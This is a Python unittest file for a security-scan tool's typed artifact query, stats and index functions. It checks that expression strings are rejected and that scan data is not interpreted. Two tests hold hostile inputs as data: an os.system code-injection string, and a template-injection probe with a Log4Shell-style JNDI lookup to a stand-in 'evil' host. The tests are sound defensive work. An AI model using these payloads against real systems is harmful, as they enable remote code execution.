#!/usr/bin/env python3
"""Artifact access primitives (spec §7).

A crawl of one application yields 10k+ rows and a template scan across 500
hosts produces megabytes. 256K of context cannot hold a run, and dumping tool
output into the conversation is also the widest possible injection surface.

So tools return references, and the model reasons over them through exactly
two typed primitives. `where` is a list of typed predicates, never an
expression string — there is nothing to evaluate, so there is nothing to
inject into.
"""
import json
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "scripts" / "security"))

import artifacts as A  # noqa: E402

ROWS = [
    {"url": "https://web.lab.example.com/", "status_code": 200, "tech": ["Nginx"],
     "title": "Portal", "tainted": True},
    {"url": "https://web.lab.example.com/admin", "status_code": 403, "tech": ["Nginx"],
     "title": "Forbidden", "tainted": True},
    {"url": "https://api.lab.example.com/v1", "status_code": 200, "tech": ["Envoy"],
     "title": "API", "tainted": True},
    {"url": "https://api.lab.example.com/v2", "status_code": 500, "tech": ["Envoy"],
     "title": "Error", "tainted": True},
    {"url": "https://old.lab.example.com/", "status_code": 200, "tech": [],
     "title": "Legacy", "tainted": True},
]


class ArtifactCase(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="claw-artifacts-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.path = self.tmp / "scans" / "httpx-0001.jsonl"
        self.path.parent.mkdir(parents=True)
        self.path.write_text("".join(json.dumps(r) + "\n" for r in ROWS), encoding="utf-8")


class TestQuery(ArtifactCase):
    def test_no_predicate_returns_every_row(self):
        self.assertEqual(A.query(self.path)["count"], 5)

    def test_equality_predicate(self):
        out = A.query(self.path, where=[{"field": "status_code", "op": "eq", "value": 200}])
        self.assertEqual(out["count"], 3)

    def test_inequality_predicate(self):
        out = A.query(self.path, where=[{"field": "status_code", "op": "ne", "value": 200}])
        self.assertEqual(out["count"], 2)

    def test_comparison_predicates(self):
        self.assertEqual(
            A.query(self.path, where=[{"field": "status_code", "op": "gte", "value": 400}])["count"], 2)
        self.assertEqual(
            A.query(self.path, where=[{"field": "status_code", "op": "lt", "value": 300}])["count"], 3)

    def test_contains_predicate(self):
        out = A.query(self.path, where=[{"field": "url", "op": "contains", "value": "/admin"}])
        self.assertEqual(out["count"], 1)

    def test_in_predicate(self):
        out = A.query(self.path, where=[{"field": "status_code", "op": "in", "value": [403, 500]}])
        self.assertEqual(out["count"], 2)

    def test_exists_predicate(self):
        self.assertEqual(A.query(self.path, where=[{"field": "title", "op": "exists"}])["count"], 5)
        self.assertEqual(A.query(self.path, where=[{"field": "nope", "op": "exists"}])["count"], 0)

    def test_predicates_are_conjunctive(self):
        out = A.query(self.path, where=[
            {"field": "status_code", "op": "eq", "value": 200},
            {"field": "url", "op": "contains", "value": "api."},
        ])
        self.assertEqual(out["count"], 1)

    def test_fields_projection(self):
        out = A.query(self.path, fields=["url", "status_code"], limit=1)
        self.assertEqual(set(out["rows"][0]), {"url", "status_code"})

    def test_limit_is_capped(self):
        out = A.query(self.path, limit=10_000)
        self.assertLessEqual(len(out["rows"]), A.MAX_LIMIT)

    def test_limit_below_the_cap_is_honoured(self):
        self.assertEqual(len(A.query(self.path, limit=2)["rows"]), 2)

    def test_count_reflects_matches_not_the_returned_page(self):
        out = A.query(self.path, limit=1)
        self.assertEqual(out["count"], 5)
        self.assertEqual(len(out["rows"]), 1)
        self.assertTrue(out["truncated"])

    def test_unknown_operator_is_rejected(self):
        with self.assertRaises(A.QueryError):
            A.query(self.path, where=[{"field": "url", "op": "regex", "value": ".*"}])

    def test_an_expression_string_is_not_accepted_as_a_predicate(self):
        # There is no expression evaluator, by construction.
        with self.assertRaises(A.QueryError):
            A.query(self.path, where="status_code == 200 or __import__('os').system('id')")

    def test_predicate_without_a_field_is_rejected(self):
        with self.assertRaises(A.QueryError):
            A.query(self.path, where=[{"op": "eq", "value": 200}])

    def test_missing_artifact_is_a_typed_error(self):
        with self.assertRaises(A.ArtifactNotFound):
            A.query(self.tmp / "scans" / "nope.jsonl")

    def test_rows_carry_provenance_back_to_the_artifact(self):
        out = A.query(self.path, limit=1, provenance=True)
        prov = out["rows"][0]["provenance"]
        self.assertEqual(prov["row"], 0)
        self.assertIn("httpx-0001.jsonl", prov["artifact"])


class TestStats(ArtifactCase):
    def test_group_by_counts(self):
        out = A.stats(self.path, group_by="status_code")
        self.assertEqual(out["groups"], [{"status_code": 200, "count": 3},
                                         {"status_code": 403, "count": 1},
                                         {"status_code": 500, "count": 1}])

    def test_group_by_a_list_field_counts_each_member(self):
        out = A.stats(self.path, group_by="tech")
        counts = {g["tech"]: g["count"] for g in out["groups"]}
        self.assertEqual(counts["Nginx"], 2)
        self.assertEqual(counts["Envoy"], 2)

    def test_count_distinct_metric(self):
        out = A.stats(self.path, group_by="status_code", metric="count_distinct:url")
        self.assertEqual(out["groups"][0]["count_distinct_url"], 3)

    def test_total_is_reported(self):
        self.assertEqual(A.stats(self.path, group_by="status_code")["total"], 5)

    def test_stats_never_returns_rows(self):
        # This is the point: reason about 11k rows without reading them.
        self.assertNotIn("rows", A.stats(self.path, group_by="status_code"))

    def test_unknown_metric_is_rejected(self):
        with self.assertRaises(A.QueryError):
            A.stats(self.path, group_by="url", metric="sum:everything")

    def test_missing_group_field_yields_no_groups(self):
        self.assertEqual(A.stats(self.path, group_by="absent")["groups"], [])

    def test_groups_are_ordered_by_count_descending_then_key(self):
        out = A.stats(self.path, group_by="status_code")
        counts = [g["count"] for g in out["groups"]]
        self.assertEqual(counts, sorted(counts, reverse=True))


class TestIndex(ArtifactCase):
    def test_index_lists_artifacts_with_counts(self):
        entries = A.index(self.tmp)
        self.assertEqual(len(entries), 1)
        self.assertEqual(entries[0]["count"], 5)
        self.assertIn("status_code", entries[0]["schema"])

    def test_index_reports_tainted_artifacts(self):
        self.assertTrue(A.index(self.tmp)[0]["tainted"])

    def test_index_of_an_empty_engagement_is_empty(self):
        self.assertEqual(A.index(self.tmp / "nothing"), [])


class TestInjectionThroughArtifacts(ArtifactCase):
    def test_a_hostile_field_name_cannot_reach_the_predicate_engine(self):
        hostile = self.tmp / "scans" / "hostile.jsonl"
        hostile.write_text(json.dumps({"__class__": "x", "url": "https://a"}) + "\n")
        out = A.query(hostile, where=[{"field": "__class__", "op": "eq", "value": "x"}])
        self.assertEqual(out["count"], 1)

    def test_row_values_are_returned_as_data_not_interpreted(self):
        hostile = self.tmp / "scans" / "hostile.jsonl"
        hostile.write_text(json.dumps(
            {"url": "https://a", "title": "{{ 7*7 }} ${jndi:ldap://evil}"}) + "\n")
        row = A.query(hostile, limit=1)["rows"][0]
        self.assertIn("{{ 7*7 }}", row["title"])


if __name__ == "__main__":
    unittest.main()
